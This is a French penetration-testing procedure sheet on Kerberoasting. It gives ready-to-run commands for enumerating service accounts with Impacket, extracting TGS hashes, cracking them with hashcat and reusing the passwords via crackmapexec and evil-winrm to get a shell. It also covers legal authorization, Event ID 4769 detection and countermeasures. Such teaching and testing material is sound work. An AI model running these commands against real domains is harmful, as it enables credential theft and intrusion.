# 🔑 Kerberoasting — Attaque Active Directory

> Extraction et cassage de hashes de comptes de service AD

---

## 📋 Contexte d'utilisation

Phase de **post-exploitation** dans un environnement Active Directory. Nécessite uniquement des **credentials d'un utilisateur standard du domaine** (aucun privilège spécial requis).

## 🛠️ Prérequis

- Credentials valides d'un utilisateur du domaine
- Accès réseau au Domain Controller (port 88 Kerberos)
- Outils : Impacket, hashcat
- Wordlist : rockyou.txt

---

## ⚙️ Procédure

### Étape 1 : Identifier les comptes avec SPN

```bash
impacket-GetUserSPNs CORP.LOCAL/jdoe:'Welcome1!' -dc-ip 10.10.10.100
```

**Résultat attendu :** Liste des comptes de service avec leurs SPN (Service Principal Name).

### Étape 2 : Demander les TGS (tickets Kerberos)

```bash
impacket-GetUserSPNs CORP.LOCAL/jdoe:'Welcome1!' -dc-ip 10.10.10.100 -request -output tgs.txt
```

**Résultat :** Fichier `tgs.txt` contenant les hashes Kerberos TGS-REP.

### Étape 3 : Cracker les hashes offline

```bash
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
```

**Résultat :** Mots de passe en clair des comptes de service.

### Étape 4 : Réutiliser les credentials

```bash
# Tester l'accès avec le mot de passe trouvé
crackmapexec smb 10.10.10.100 -u svc_mssql -p 'P@ssw0rd' --shares

# Obtenir un shell interactif
evil-winrm -i 10.10.10.100 -u svc_mssql -p 'P@ssw0rd'
```

---

## 📊 Résultats attendus

| Étape | Résultat |
|-------|----------|
| Énumération SPN | Liste des comptes de service |
| Extraction TGS | Hashes Kerberos TGS-REP (fichier) |
| Cassage offline | Mots de passe en clair |
| Réutilisation | Accès aux services et machines |

---

## ⚠️ Points de vigilance

> ⚖️ **Légal** : Autorisation écrite obligatoire avant toute action.

> 🚨 **Détection** : Génère des **Event ID 4769** (Kerberos Service Ticket Operations) sur le Domain Controller. Un nombre anormal de requêtes TGS peut alerter le SOC.

> 💡 **Note** : Le Kerberoasting est une attaque **offline** — une fois les TGS obtenus, le cassage se fait sur ta machine sans aucune interaction avec le DC.

---

## 🛡️ Contre-mesures

| Mesure | Description |
|--------|-------------|
| **Mots de passe longs** | 25+ caractères aléatoires pour les comptes de service |
| **gMSA** | Group Managed Service Accounts (rotation automatique) |
| **Monitoring** | Surveillance Event ID 4769 avec volume anormal |
| **AES Encryption** | Forcer AES256 au lieu de RC4 pour les TGS |
| **Audit SPN** | Revue régulière des comptes avec SPN |

---

## 📚 Ressources

- [HackTricks Kerberoasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast)
- [Impacket GetUserSPNs](https://github.com/fortra/impacket)
- [Hashcat Mode 13100](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [Microsoft Kerberos Documentation](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4769)

---

*Procédure rédigée par Arthur Logeais — Juin 2026*